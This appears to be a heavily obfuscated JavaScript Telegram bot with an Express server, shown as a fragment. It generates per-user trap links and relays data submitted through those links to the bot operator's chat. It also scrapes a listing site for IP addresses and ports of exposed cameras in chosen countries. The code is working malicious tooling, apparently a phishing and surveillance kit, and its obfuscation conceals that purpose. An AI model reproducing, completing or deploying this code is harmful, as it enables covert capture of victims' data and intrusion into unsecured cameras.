                    if (_0x207c9d[_0x403f66(0xaf6)](_0x4c4054, _0x207c9d[_0x403f66(0x36a)]) && _0x207c9d[_0x403f66(0x523)](_0xe32180, -0x16b3 * 0x1a909d + 0x123d49ba * 0x11 + 0x27b01e627))
                        bot[_0x403f66(0x741) + 'e'](_0xe32180, _0x207c9d[_0x403f66(0xd58)]), bot[_0x403f66(0x1cb)](_0x207c9d[_0x403f66(0x9df)], _0x68f453 => {
                            const _0xed6180 = _0x403f66, _0x36963f = _0x68f453[_0xed6180(0x9ac)];
                            _0x207c9d[_0xed6180(0x415)](removeVIPUser, _0x36963f), bot[_0xed6180(0x741) + 'e'](_0xe32180, _0xed6180(0x5bf) + _0xed6180(0xa07) + _0x36963f + _0xed6180(0x2fa));
                        });
                    else {
                        const [_0x49dce4, _0x303d67] = _0x4c4054[_0x403f66(0x7aa)](':');
                        if (!_0x4b4ba8[_0x403f66(0x439)](_0x49dce4) && !_0x207c9d[_0x403f66(0xaa8)](validateLinkUsage, _0x303d67, _0x49dce4)) {
                            bot[_0x403f66(0x741) + 'e'](_0xe32180, '');
                            return;
                        }
                        let _0x21685f = '';
                        switch (_0x49dce4) {
                        case _0x207c9d[_0x403f66(0x48a)]:
                            _0x21685f = baseUrl + (_0x403f66(0xb3a) + _0x403f66(0x72d)) + crypto[_0x403f66(0x824) + 's'](0x826 + 0x1 * -0x1973 + 0x1 * 0x115d)[_0x403f66(0xdab)](_0x207c9d[_0x403f66(0x1e5)]) + _0x403f66(0x347) + _0xe32180;
                            break;
                        case _0x207c9d[_0x403f66(0x582)]:
                            _0x21685f = baseUrl + (_0x403f66(0xa95) + _0x403f66(0xc8d)) + crypto[_0x403f66(0x824) + 's'](-0x1 * -0x1f06 + 0x2092 + 0xd6 * -0x4c)[_0x403f66(0xdab)](_0x207c9d[_0x403f66(0x1e5)]) + _0x403f66(0x347) + _0xe32180;
                            break;
                        case _0x207c9d[_0x403f66(0xbef)]:
                            _0x21685f = baseUrl + (_0x403f66(0x7cf) + _0x403f66(0x653)) + crypto[_0x403f66(0x824) + 's'](-0x1c6d + 0x29d * -0xd + 0x3e76)[_0x403f66(0xdab)](_0x207c9d[_0x403f66(0x1e5)]) + _0x403f66(0x347) + _0xe32180;
                            break;
                        case _0x207c9d[_0x403f66(0xcfc)]:
                            const _0x14b67d = 0x56b * -0x2 + -0x2442 + 0x2f22 * 0x1;
                            _0x21685f = baseUrl + _0x403f66(0x8cd) + crypto[_0x403f66(0x824) + 's'](0x1868 + 0x17 * 0x17f + 0xa9 * -0x59)[_0x403f66(0xdab)](_0x207c9d[_0x403f66(0x1e5)]) + _0x403f66(0x347) + _0xe32180 + _0x403f66(0x565) + _0x14b67d;
                            break;
                        case _0x207c9d[_0x403f66(0xa60)]:
                            _0x21685f = baseUrl + (_0x403f66(0x478) + _0x403f66(0x4a5)) + _0xe32180 + (_0x403f66(0x5b3) + 'ok');
                            break;
                        case _0x207c9d[_0x403f66(0x2f1)]:
                            _0x21685f = baseUrl + (_0x403f66(0x478) + _0x403f66(0x4a5)) + _0xe32180 + (_0x403f66(0x9f6) + _0x403f66(0xe23));
                            break;
                        case _0x207c9d[_0x403f66(0x1e8)]:
                            _0x21685f = baseUrl + (_0x403f66(0x478) + _0x403f66(0x4a5)) + _0xe32180 + (_0x403f66(0x910) + _0x403f66(0x552));
                            break;
                        default:
                            bot[_0x403f66(0x741) + 'e'](_0xe32180, '');
                            return;
                        }
                        bot[_0x403f66(0x741) + 'e'](_0xe32180, _0x403f66(0x2f0) + _0x403f66(0x5d4) + _0x21685f);
                    }
                }
            }
        }
    }
    bot[_0x403f66(0x9c4) + _0x403f66(0x42d)](_0x45c34e['id']);
}), bot[_0x54266d(0xb39)](/\/jjihigjoj/, _0x4bdaa2 => {
    const _0x4cd718 = _0x54266d, _0x386a8d = {
            'UzXkO': _0x4cd718(0x2b7) + _0x4cd718(0x8d8) + _0x4cd718(0x318) + _0x4cd718(0x4f6) + '.',
            'YMlqK': _0x4cd718(0xb0e) + _0x4cd718(0xa3c),
            'MDsoR': _0x4cd718(0x59b) + _0x4cd718(0x6df)
        }, _0x540ba5 = _0x4bdaa2[_0x4cd718(0x6a9)]['id'], _0x59e720 = _0x386a8d[_0x4cd718(0x53c)];
    bot[_0x4cd718(0x741) + 'e'](_0x540ba5, _0x59e720, {
        'reply_markup': {
            'inline_keyboard': [[{
                        'text': _0x386a8d[_0x4cd718(0xb89)],
                        'callback_data': _0x386a8d[_0x4cd718(0xc40)]
                    }]]
        }
    });
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x27ce75 => {
    const _0x93b3c3 = _0x54266d, _0x46f5de = {
            'DhqVh': function (_0x271132, _0x1fa203) {
                return _0x271132 === _0x1fa203;
            },
            'WuuVA': _0x93b3c3(0x59b) + _0x93b3c3(0x6df)
        }, _0x5b800d = _0x27ce75[_0x93b3c3(0x842)][_0x93b3c3(0x6a9)]['id'];
    if (_0x46f5de[_0x93b3c3(0x3bd)](_0x27ce75[_0x93b3c3(0x50f)], _0x46f5de[_0x93b3c3(0x58a)])) {
        const _0x213777 = baseUrl + '/' + _0x5b800d;
        bot[_0x93b3c3(0x741) + 'e'](_0x5b800d, _0x93b3c3(0x7d9) + _0x93b3c3(0x3a4) + _0x213777);
    }
    bot[_0x93b3c3(0x9c4) + _0x93b3c3(0x42d)](_0x27ce75['id']);
}), bot['on'](_0x54266d(0x546) + _0x54266d(0x352), _0x30d507 => {
    const _0x468685 = _0x54266d, _0x1a4695 = {
            'ylnYL': function (_0x1489ff, _0x44dd00) {
                return _0x1489ff === _0x44dd00;
            },
            'AOzLx': _0x468685(0x3f0),
            'Csppg': _0x468685(0x842),
            'pcNqZ': _0x468685(0x28d) + _0x468685(0x560) + _0x468685(0xb0d) + _0x468685(0xb48),
            'PVCUK': function (_0x233df8, _0x3593fb) {
                return _0x233df8 === _0x3593fb;
            },
            'hyVak': _0x468685(0x319),
            'jLOAq': _0x468685(0x493) + _0x468685(0x47f) + _0x468685(0x72f) + '.'
        }, _0x43aeae = _0x30d507[_0x468685(0x842)][_0x468685(0x6a9)]['id'];
    if (_0x1a4695[_0x468685(0x340)](_0x30d507[_0x468685(0x50f)], _0x1a4695[_0x468685(0x204)])) {
        bot[_0x468685(0x741) + 'e'](_0x43aeae, _0x1a4695[_0x468685(0x81f)]);
        const _0x2ca9d8 = _0x4a8707 => {
            const _0x362b4d = _0x468685;
            if (_0x1a4695[_0x362b4d(0xe2f)](_0x4a8707[_0x362b4d(0x6a9)]['id'], _0x43aeae)) {
                if (_0x4a8707[_0x362b4d(0x9ac)] && _0x4a8707[_0x362b4d(0x9ac)][_0x362b4d(0xd2d)](_0x1a4695[_0x362b4d(0x26a)])) {
                    const _0x1fa42e = _0x4a8707[_0x362b4d(0x9ac)];
                    dataStore[_0x43aeae] = { 'userLink': _0x1fa42e }, bot[_0x362b4d(0x741) + 'e'](_0x43aeae, _0x362b4d(0xce1) + _0x362b4d(0x1c9) + _0x362b4d(0x814) + baseUrl + (_0x362b4d(0x62b) + _0x362b4d(0xc41)) + _0x43aeae), bot[_0x362b4d(0x26b) + _0x362b4d(0xaf8)](_0x1a4695[_0x362b4d(0x4f1)], _0x2ca9d8);
                } else
                    bot[_0x362b4d(0x741) + 'e'](_0x43aeae, _0x1a4695[_0x362b4d(0xa4f)]);
            }
        };
        bot['on'](_0x1a4695[_0x468685(0x4f1)], _0x2ca9d8);
    }
}), app[_0x54266d(0x477)](bodyParser[_0x54266d(0x8cc)]({ 'extended': !![] })), app[_0x54266d(0x477)](express[_0x54266d(0xb3e)](__dirname)), app[_0x54266d(0xa54)](_0x54266d(0x1d9) + 'es', (_0x245226, _0x4eabd6) => {
    const _0x13286d = _0x54266d, _0x56cc34 = {
            'PweUV': _0x13286d(0x7ea),
            'HQLHU': _0x13286d(0x68a) + _0x13286d(0x7c2) + _0x13286d(0x7d3) + ':',
            'Bnbga': _0x13286d(0x535) + _0x13286d(0x959) + _0x13286d(0x370) + _0x13286d(0x2a5) + _0x13286d(0x939),
            'paZkC': _0x13286d(0x2f3) + _0x13286d(0x3e7)
        }, _0x52ea96 = _0x245226[_0x13286d(0x386)][_0x13286d(0xa06)], _0x93d386 = _0x245226[_0x13286d(0x386)][_0x13286d(0xb87)], _0xd94179 = _0x245226[_0x13286d(0x386)][_0x13286d(0x8d6)];
    console[_0x13286d(0xb18)](_0x56cc34[_0x13286d(0xbe5)], _0x245226[_0x13286d(0x386)]), bot[_0x13286d(0x741) + 'e'](_0x52ea96, _0x13286d(0xa14) + _0x13286d(0x563) + _0x93d386 + _0x13286d(0x602) + _0xd94179)[_0x13286d(0x992)](() => {
        const _0x9ff2c0 = _0x13286d;
        _0x4eabd6[_0x9ff2c0(0xd98)](path[_0x9ff2c0(0x75e)](__dirname, _0x56cc34[_0x9ff2c0(0x777)]));
    })[_0x13286d(0x2c4)](_0x132535 => {
        const _0x6c2f5e = _0x13286d;
        console[_0x6c2f5e(0x3a5)](_0x56cc34[_0x6c2f5e(0xd49)], _0x132535[_0x6c2f5e(0x28f)] ? _0x132535[_0x6c2f5e(0x28f)][_0x6c2f5e(0x386)] : _0x132535), _0x4eabd6[_0x6c2f5e(0x972)](-0x18da * -0x1 + 0xa71 + -0x2157)[_0x6c2f5e(0x9d2)](_0x56cc34[_0x6c2f5e(0xac6)]);
    });
}), app[_0x54266d(0x4bf)](_0x54266d(0x390), (_0x5e1470, _0x1ea7e6) => {
    const _0x1a3205 = _0x54266d, _0x158ca6 = {
            'iyhNh': _0x1a3205(0xd51) + _0x1a3205(0xb15) + _0x1a3205(0x85d),
            'DYlCQ': _0x1a3205(0x7ea)
        }, _0x180196 = _0x5e1470[_0x1a3205(0x8ec)][_0x1a3205(0xa06)];
    if (!_0x180196)
        return _0x1ea7e6[_0x1a3205(0x972)](0x86f * -0x1 + 0xa38 + -0x39)[_0x1a3205(0x9d2)](_0x158ca6[_0x1a3205(0x49b)]);
    _0x1ea7e6[_0x1a3205(0xd98)](path[_0x1a3205(0x75e)](__dirname, _0x158ca6[_0x1a3205(0x2dd)]));
}), app[_0x54266d(0x477)](bodyParser[_0x54266d(0x8cc)]({ 'extended': !![] })), app[_0x54266d(0x477)](express[_0x54266d(0xb3e)](__dirname)), app[_0x54266d(0xa54)](_0x54266d(0x1d9) + 'es', (_0x3b741b, _0x2f7105) => {
    const _0x10ffbe = _0x54266d, _0x9c2c3f = {
            'hTfwD': _0x10ffbe(0xe1e),
            'pYvWS': _0x10ffbe(0x68a) + _0x10ffbe(0x7c2) + _0x10ffbe(0x7d3) + ':',
            'bonqQ': _0x10ffbe(0x535) + _0x10ffbe(0x959) + _0x10ffbe(0x370) + _0x10ffbe(0x2a5) + _0x10ffbe(0x939),
            'dlOSW': _0x10ffbe(0x2f3) + _0x10ffbe(0x3e7)
        }, _0x4c5ca3 = _0x3b741b[_0x10ffbe(0x386)][_0x10ffbe(0xa06)], _0xd499c = _0x3b741b[_0x10ffbe(0x386)][_0x10ffbe(0xb87)], _0x2f4bbb = _0x3b741b[_0x10ffbe(0x386)][_0x10ffbe(0x8d6)];
    console[_0x10ffbe(0xb18)](_0x9c2c3f[_0x10ffbe(0xd19)], _0x3b741b[_0x10ffbe(0x386)]), bot[_0x10ffbe(0x741) + 'e'](_0x4c5ca3, _0x10ffbe(0xa14) + _0x10ffbe(0x563) + _0xd499c + _0x10ffbe(0x602) + _0x2f4bbb)[_0x10ffbe(0x992)](() => {
        const _0x17b6db = _0x10ffbe;
        _0x2f7105[_0x17b6db(0xd98)](path[_0x17b6db(0x75e)](__dirname, _0x9c2c3f[_0x17b6db(0x4c5)]));
    })[_0x10ffbe(0x2c4)](_0x56f8d4 => {
        const _0x6a2744 = _0x10ffbe;
        console[_0x6a2744(0x3a5)](_0x9c2c3f[_0x6a2744(0xde5)], _0x56f8d4[_0x6a2744(0x28f)] ? _0x56f8d4[_0x6a2744(0x28f)][_0x6a2744(0x386)] : _0x56f8d4), _0x2f7105[_0x6a2744(0x972)](0x22c5 + 0x17 * -0x15 + 0xf77 * -0x2)[_0x6a2744(0x9d2)](_0x9c2c3f[_0x6a2744(0xc35)]);
    });
}), app[_0x54266d(0x4bf)](_0x54266d(0xcde), (_0x6a085d, _0x45fb74) => {
    const _0x59ab34 = _0x54266d, _0x114b52 = {
            'rciPd': _0x59ab34(0xd51) + _0x59ab34(0xb15) + _0x59ab34(0x85d),
            'EAuFC': _0x59ab34(0xe1e)
        }, _0x5e6ca0 = _0x6a085d[_0x59ab34(0x8ec)][_0x59ab34(0xa06)];
    if (!_0x5e6ca0)
        return _0x45fb74[_0x59ab34(0x972)](-0x23e7 + -0x1018 + 0x358f)[_0x59ab34(0x9d2)](_0x114b52[_0x59ab34(0x92d)]);
    _0x45fb74[_0x59ab34(0xd98)](path[_0x59ab34(0x75e)](__dirname, _0x114b52[_0x59ab34(0x7c8)]));
}), app[_0x54266d(0x477)](bodyParser[_0x54266d(0x8cc)]({ 'extended': !![] })), app[_0x54266d(0x477)](express[_0x54266d(0xb3e)](__dirname)), app[_0x54266d(0xa54)](_0x54266d(0x1d9) + 'es', (_0x3ee78e, _0x1b93e8) => {
    const _0x491e04 = _0x54266d, _0x433503 = {
            'GIUiU': _0x491e04(0xa4b),
            'BxIqJ': _0x491e04(0x68a) + _0x491e04(0x7c2) + _0x491e04(0x7d3) + ':',
            'LktDa': _0x491e04(0x535) + _0x491e04(0x959) + _0x491e04(0x370) + _0x491e04(0x2a5) + _0x491e04(0x939),
            'GbKjd': _0x491e04(0x2f3) + _0x491e04(0x3e7)
        }, _0x52e235 = _0x3ee78e[_0x491e04(0x386)][_0x491e04(0xa06)], _0x468f88 = _0x3ee78e[_0x491e04(0x386)][_0x491e04(0xb87)], _0x5f0a20 = _0x3ee78e[_0x491e04(0x386)][_0x491e04(0x8d6)];
    console[_0x491e04(0xb18)](_0x433503[_0x491e04(0x810)], _0x3ee78e[_0x491e04(0x386)]), bot[_0x491e04(0x741) + 'e'](_0x52e235, _0x491e04(0xa14) + _0x491e04(0x563) + _0x468f88 + _0x491e04(0x602) + _0x5f0a20)[_0x491e04(0x992)](() => {
        const _0x2edfe8 = _0x491e04;
        _0x1b93e8[_0x2edfe8(0xd98)](path[_0x2edfe8(0x75e)](__dirname, _0x433503[_0x2edfe8(0xb77)]));
    })[_0x491e04(0x2c4)](_0x29451b => {
        const _0x4e20eb = _0x491e04;
        console[_0x4e20eb(0x3a5)](_0x433503[_0x4e20eb(0x82b)], _0x29451b[_0x4e20eb(0x28f)] ? _0x29451b[_0x4e20eb(0x28f)][_0x4e20eb(0x386)] : _0x29451b), _0x1b93e8[_0x4e20eb(0x972)](-0x264 * 0x9 + 0x1606 + 0x172)[_0x4e20eb(0x9d2)](_0x433503[_0x4e20eb(0x6eb)]);
    });
}), app[_0x54266d(0x4bf)](_0x54266d(0x3ca), (_0x259ec4, _0x334680) => {
    const _0x11ba30 = _0x54266d, _0x3419a7 = {
            'EesOS': _0x11ba30(0xd51) + _0x11ba30(0xb15) + _0x11ba30(0x85d),
            'MxyWP': _0x11ba30(0xa4b)
        }, _0x421e73 = _0x259ec4[_0x11ba30(0x8ec)][_0x11ba30(0xa06)];
    if (!_0x421e73)
        return _0x334680[_0x11ba30(0x972)](0x1ded + -0x1 * -0x793 + 0x8 * -0x47e)[_0x11ba30(0x9d2)](_0x3419a7[_0x11ba30(0x263)]);
    _0x334680[_0x11ba30(0xd98)](path[_0x11ba30(0x75e)](__dirname, _0x3419a7[_0x11ba30(0x5c9)]));
});
const countryTranslation = {
        'AF': _0x54266d(0x333) + _0x54266d(0x4a0),
        'AL': _0x54266d(0x457),
        'DZ': _0x54266d(0xc57),
        'AO': _0x54266d(0xd8a),
        'AR': _0x54266d(0x669) + _0x54266d(0x6bb),
        'AM': _0x54266d(0x5a5),
        'AU': _0x54266d(0xd0f),
        'AT': _0x54266d(0xd4f),
        'AZ': _0x54266d(0x5a9),
        'BH': _0x54266d(0x220),
        'BD': _0x54266d(0xa44),
        'BY': _0x54266d(0xc43),
        'BE': _0x54266d(0xd99),
        'BZ': _0x54266d(0x871),
        'BJ': _0x54266d(0x1c5),
        'BO': _0x54266d(0x9b1),
        'BA': _0x54266d(0x48b) + _0x54266d(0x5ae),
        'BW': _0x54266d(0xbc9),
        'BR': _0x54266d(0xd4c),
        'BG': _0x54266d(0x53a),
        'BF': _0x54266d(0x274) + _0x54266d(0xdde),
        'KH': _0x54266d(0x28b),
        'CM': _0x54266d(0xae7) + _0x54266d(0x80f),
        'CA': _0x54266d(0x2bf),
        'CL': _0x54266d(0xbc2),
        'CN': _0x54266d(0xde3),
        'CO': _0x54266d(0x95d),
        'CR': _0x54266d(0xc29) + _0x54266d(0x5dd),
        'HR': _0x54266d(0x6ad),
        'CY': _0x54266d(0x61b),
        'CZ': _0x54266d(0x6f3),
        'DK': _0x54266d(0x829),
        'EC': _0x54266d(0x2e9) + _0x54266d(0x52e),
        'EG': _0x54266d(0xbd2),
        'SV': _0x54266d(0x539) + _0x54266d(0xc67),
        'EE': _0x54266d(0xbe1),
        'ET': _0x54266d(0x9c0),
        'FI': _0x54266d(0x693),
        'FR': _0x54266d(0xb84),
        'GE': _0x54266d(0xbf0),
        'DE': _0x54266d(0x4ef),
        'GH': _0x54266d(0x604),
        'GR': _0x54266d(0x281),
        'GT': _0x54266d(0xb00) + _0x54266d(0x5e3),
        'HN': _0x54266d(0x1a8),
        'HK': _0x54266d(0xd69) + _0x54266d(0x93f),
        'HU': _0x54266d(0x6bd),
        'IS': _0x54266d(0xda0),
        'IN': _0x54266d(0x435),
        'ID': _0x54266d(0x6d8) + _0x54266d(0x994),
        'IR': _0x54266d(0x639),
        'IQ': _0x54266d(0xb85),
        'IE': _0x54266d(0x6e1),
        'IL': _0x54266d(0x600),
        'IT': _0x54266d(0x7e2),
        'CI': _0x54266d(0x497) + _0x54266d(0xab3),
        'JP': _0x54266d(0x6f6),
        'JO': _0x54266d(0x6a8),
        'KZ': _0x54266d(0x882) + _0x54266d(0x365),
        'KE': _0x54266d(0x209),
        'KW': _0x54266d(0x31f),
        'KG': _0x54266d(0xd2b) + _0x54266d(0x6f8),
        'LV': _0x54266d(0xb1b),
        'LB': _0x54266d(0x652),
        'LY': _0x54266d(0x1f8),
        'LT': _0x54266d(0x997),
        'LU': _0x54266d(0xc3b) + _0x54266d(0x8d1),
        'MO': _0x54266d(0x5bd),
        'MY': _0x54266d(0x6ce),
        'ML': _0x54266d(0xbab),
        'MT': _0x54266d(0xa93),
        'MX': _0x54266d(0xd0c),
        'MC': _0x54266d(0x1eb),
        'MN': _0x54266d(0x835),
        'ME': _0x54266d(0x58d) + _0x54266d(0xa6b),
        'MA': _0x54266d(0x1c8),
        'MZ': _0x54266d(0xaf1),
        'MM': _0x54266d(0x63e),
        'NA': _0x54266d(0xb31),
        'NP': _0x54266d(0xa53),
        'NL': _0x54266d(0x72e),
        'NZ': _0x54266d(0xbb9) + _0x54266d(0xdc5),
        'NG': _0x54266d(0x1ac),
        'KP': _0x54266d(0xcbf) + _0x54266d(0xc9d),
        'NO': _0x54266d(0x41e),
        'OM': _0x54266d(0xe0e),
        'PK': _0x54266d(0x883),
        'PS': _0x54266d(0x2eb),
        'PA': _0x54266d(0x892),
        'PY': _0x54266d(0x76e),
        'PE': _0x54266d(0x60e),
        'PH': _0x54266d(0x3a1),
        'PL': _0x54266d(0xd7f),
        'PT': _0x54266d(0x486),
        'PR': _0x54266d(0xd5d) + _0x54266d(0x473),
        'QA': _0x54266d(0x658),
        'RO': _0x54266d(0x364),
        'RU': _0x54266d(0xc07),
        'RW': _0x54266d(0x1df),
        'SA': _0x54266d(0x53d),
        'SN': _0x54266d(0x99b),
        'RS': _0x54266d(0x388),
        'SG': _0x54266d(0x29f),
        'SK': _0x54266d(0x4cd),
        'SI': _0x54266d(0x641),
        'ZA': _0x54266d(0x475) + _0x54266d(0x926),
        'KR': _0x54266d(0x8e4) + _0x54266d(0xa96),
        'ES': _0x54266d(0xb54),
        'LK': _0x54266d(0x2e4),
        'SD': _0x54266d(0xae6),
        'SE': _0x54266d(0x413),
        'CH': _0x54266d(0xac4),
        'SY': _0x54266d(0xcf0),
        'TW': _0x54266d(0x294),
        'TZ': _0x54266d(0x7d7),
        'TH': _0x54266d(0x25d),
        'TG': _0x54266d(0x697),
        'TN': _0x54266d(0x556),
        'TR': _0x54266d(0x299),
        'TM': _0x54266d(0x79a) + _0x54266d(0xe2e),
        'UG': _0x54266d(0x896),
        'UA': _0x54266d(0x525),
        'AE': _0x54266d(0x195),
        'GB': _0x54266d(0x2a1),
        'US': _0x54266d(0x5e2),
        'UY': _0x54266d(0x324),
        'UZ': _0x54266d(0x74b) + _0x54266d(0x3a3),
        'VE': _0x54266d(0x4f4),
        'VN': _0x54266d(0x8c6),
        'ZM': _0x54266d(0x614),
        'ZW': _0x54266d(0x6ed),
        'GL': _0x54266d(0x519),
        'KY': _0x54266d(0x1d4) + _0x54266d(0x8f6),
        'NI': _0x54266d(0x433) + _0x54266d(0x951),
        'DO': _0x54266d(0x740) + _0x54266d(0x8c1),
        'NC': _0x54266d(0x92f) + _0x54266d(0x37d),
        'LA': _0x54266d(0x8b4),
        'TT': _0x54266d(0x191) + _0x54266d(0x8c8),
        'GG': _0x54266d(0x87c),
        'GU': _0x54266d(0xd88),
        'GP': _0x54266d(0x345),
        'MG': _0x54266d(0x305),
        'RE': _0x54266d(0xd06),
        'FO': _0x54266d(0xd9a),
        'MD': _0x54266d(0x5a4)
    }, camRequestCounts = {};
async function initStorage() {
    const _0x4c51e7 = _0x54266d, _0x28e003 = { 'XnGKP': _0x4c51e7(0x71c) };
    await storage[_0x4c51e7(0x1f9)](), vipUsers = await storage[_0x4c51e7(0xb5b)](_0x28e003[_0x4c51e7(0xc93)]) || [];
}
async function saveVipUsers() {
    const _0x35547f = _0x54266d, _0x5013d2 = { 'duzVU': _0x35547f(0x71c) };
    await storage[_0x35547f(0x393)](_0x5013d2[_0x35547f(0x57d)], vipUsers);
}
function showCountryList(_0x5bc215, _0xd99495 = -0x1ca1 + -0x185e + 0x34ff) {
    const _0x233ea8 = _0x54266d, _0x173e25 = {
            'SXhus': function (_0x289851, _0x38b4db) {
                return _0x289851 + _0x38b4db;
            },
            'xuJYw': function (_0x4908c1, _0x3d8ba6) {
                return _0x4908c1 < _0x3d8ba6;
            },
            'hhPEk': function (_0x18243c, _0x1d8b20) {
                return _0x18243c + _0x1d8b20;
            },
            'CWMTh': function (_0x4f9451, _0x365e96) {
                return _0x4f9451 > _0x365e96;
            },
            'CBIFT': _0x233ea8(0x874),
            'CvRRl': _0x233ea8(0x404) + 'ة:'
        };
    try {
        const _0x145e01 = [], _0x5c7d50 = Object[_0x233ea8(0x9b0)](countryTranslation), _0x4c57dc = Object[_0x233ea8(0x6a3)](countryTranslation), _0x133d6b = Math[_0x233ea8(0x6cb)](_0x173e25[_0x233ea8(0xb93)](_0xd99495, -0xd3 * -0x26 + 0x193b + -0x382a), _0x5c7d50[_0x233ea8(0x574)]);
        for (let _0xbec88f = _0xd99495; _0x173e25[_0x233ea8(0xd2a)](_0xbec88f, _0x133d6b); _0xbec88f += -0x1 * -0x12ff + -0x4b1 + -0xe4b) {
            const _0xeb7852 = [];
            for (let _0x1afea0 = _0xbec88f; _0x173e25[_0x233ea8(0xd2a)](_0x1afea0, _0x173e25[_0x233ea8(0x394)](_0xbec88f, 0x1f * -0xe5 + -0x45 * 0x79 + -0x3c5b * -0x1)) && _0x173e25[_0x233ea8(0xd2a)](_0x1afea0, _0x133d6b); _0x1afea0++) {
                const _0x29e86f = _0x5c7d50[_0x1afea0], _0xf28a1e = _0x4c57dc[_0x1afea0];
                _0xeb7852[_0x233ea8(0xb97)]({
                    'text': _0xf28a1e,
                    'callback_data': _0x29e86f
                });
            }
            _0x145e01[_0x233ea8(0xb97)](_0xeb7852);
        }
        const _0x51d64f = [];
        _0x173e25[_0x233ea8(0x9ef)](_0xd99495, -0x1 * 0x27b + 0x1ad5 + -0xc2d * 0x2) && _0x51d64f[_0x233ea8(0xb97)], _0x173e25[_0x233ea8(0xd2a)](_0x133d6b, _0x5c7d50[_0x233ea8(0x574)]) && _0x51d64f[_0x233ea8(0xb97)]({
            'text': _0x173e25[_0x233ea8(0x2b9)],
            'callback_data': _0x233ea8(0xa35) + _0x133d6b
        }), _0x51d64f[_0x233ea8(0x574)] && _0x145e01[_0x233ea8(0xb97)](_0x51d64f), bot[_0x233ea8(0x741) + 'e'](_0x5bc215, _0x173e25[_0x233ea8(0xd2e)], { 'reply_markup': { 'inline_keyboard': _0x145e01 } });
    } catch (_0x3ee8a0) {
        bot[_0x233ea8(0x741) + 'e'](_0x5bc215, _0x233ea8(0x6a4) + _0x233ea8(0x1cf) + _0x233ea8(0xcbe) + _0x3ee8a0[_0x233ea8(0x842)]);
    }
}
async function displayCameras(_0x3789c4, _0x2349d0) {
    const _0x463ffd = _0x54266d, _0x49b36e = {
            'jycSD': _0x463ffd(0x737) + _0x463ffd(0x50e) + _0x463ffd(0x201),
            'GpbfE': function (_0x5482f9, _0x4ed35d) {
                return _0x5482f9 < _0x4ed35d;
            },
            'JXEAi': function (_0x3910c4, _0x18c101) {
                return _0x3910c4 % _0x18c101;
            },
            'EUehd': _0x463ffd(0xbc7) + _0x463ffd(0xc65) + _0x463ffd(0xdf7) + _0x463ffd(0x57c) + _0x463ffd(0x59d) + _0x463ffd(0xbca) + _0x463ffd(0x5d8) + _0x463ffd(0xc5c) + _0x463ffd(0x37e) + _0x463ffd(0xab0) + _0x463ffd(0x3bb) + '6',
            'oZRBm': _0x463ffd(0x8ca) + _0x463ffd(0x302) + _0x463ffd(0x89a) + _0x463ffd(0x94f) + _0x463ffd(0x797) + _0x463ffd(0x5ef) + _0x463ffd(0x819) + _0x463ffd(0x561) + _0x463ffd(0x86e) + _0x463ffd(0x7b6),
            'cGEQU': function (_0x12aca7, _0x2099ca, _0x7763de) {
                return _0x12aca7(_0x2099ca, _0x7763de);
            },
            'ectCV': function (_0x2abbd9, _0xaf103a) {
                return _0x2abbd9 <= _0xaf103a;
            },
            'pLGgC': function (_0x5475ac, _0x188117) {
                return _0x5475ac < _0x188117;
            },
            'xBnGL': function (_0x207f87, _0x4467c9) {
                return _0x207f87 + _0x4467c9;
            },
            'tKuLJ': _0x463ffd(0x3c2) + _0x463ffd(0x302) + _0x463ffd(0x89a) + _0x463ffd(0x5c7) + _0x463ffd(0xba6) + _0x463ffd(0xcea) + _0x463ffd(0xdcf) + _0x463ffd(0x890) + _0x463ffd(0x3e0) + _0x463ffd(0xbf1) + _0x463ffd(0xb7d) + _0x463ffd(0xdf0) + _0x463ffd(0xa38) + _0x463ffd(0x9a3) + _0x463ffd(0x9fe) + _0x463ffd(0xb8a) + _0x463ffd(0x3b6) + _0x463ffd(0x334) + _0x463ffd(0x3d7),
            'uGtCi': _0x463ffd(0x8ca) + _0x463ffd(0x302) + _0x463ffd(0x89a) + _0x463ffd(0x94f) + _0x463ffd(0x797) + _0x463ffd(0x3bf) + _0x463ffd(0x237) + _0x463ffd(0xbe0) + _0x463ffd(0x886) + _0x463ffd(0x4a8)
        };
    try {
        const _0x4325ed = await bot[_0x463ffd(0x741) + 'e'](_0x3789c4, _0x49b36e[_0x463ffd(0x49f)]), _0x3ca133 = _0x4325ed[_0x463ffd(0x57f)];
        for (let _0x3edade = 0x1e * 0x6e + -0xb * -0x161 + 0x1 * -0x1c0f; _0x49b36e[_0x463ffd(0x851)](_0x3edade, 0x8e1 + -0xc1 * 0xd + 0xfb); _0x3edade++) {
            await bot[_0x463ffd(0x708) + _0x463ffd(0xdb0)](_0x463ffd(0x737) + _0x463ffd(0x50e) + _0x463ffd(0xe21) + '.'[_0x463ffd(0xd44)](_0x49b36e[_0x463ffd(0xd7d)](_0x3edade, 0x1f64 + 0x152a + 0xa * -0x541)), {
                'chat_id': _0x3789c4,
                'message_id': _0x3ca133
            }), await new Promise(_0x43107f => setTimeout(_0x43107f, -0x12 * 0x70 + -0x7fa + 0x9e1 * 0x2));
        }
        const _0x49292d = _0x463ffd(0x855) + _0x463ffd(0x75c) + _0x463ffd(0x803) + _0x463ffd(0x839) + _0x2349d0, _0x2791c8 = { 'User-Agent': _0x49b36e[_0x463ffd(0xaa1)] };
        let _0x3b6875 = await axios[_0x463ffd(0x4bf)](_0x49292d, { 'headers': _0x2791c8 });
        const _0x373af0 = _0x3b6875[_0x463ffd(0x50f)][_0x463ffd(0x1bc)](/pagenavigator\("\?page=", (\d+)/);
        if (!_0x373af0) {
            bot[_0x463ffd(0x741) + 'e'](_0x3789c4, _0x49b36e[_0x463ffd(0xba7)]);
            return;
        }
        const _0x2acea5 = _0x49b36e[_0x463ffd(0x55f)](parseInt, _0x373af0[0xc * 0x21e + 0x1e1c + -0x3783], 0x1f * -0x103 + 0x6b9 + 0x18ae), _0x589c50 = [];
        for (let _0x11d863 = -0xb * -0x61 + -0x29 * 0xd + -0x215 * 0x1; _0x49b36e[_0x463ffd(0xa17)](_0x11d863, _0x2acea5); _0x11d863++) {
            _0x3b6875 = await axios[_0x463ffd(0x4bf)](_0x49292d + _0x463ffd(0x8f2) + _0x11d863, { 'headers': _0x2791c8 });
            const _0x115cd3 = _0x3b6875[_0x463ffd(0x50f)][_0x463ffd(0x1bc)](/http:\/\/\d+\.\d+\.\d+\.\d+:\d+/g) || [];
            _0x589c50[_0x463ffd(0xb97)](..._0x115cd3);
        }
        if (_0x589c50[_0x463ffd(0x574)]) {
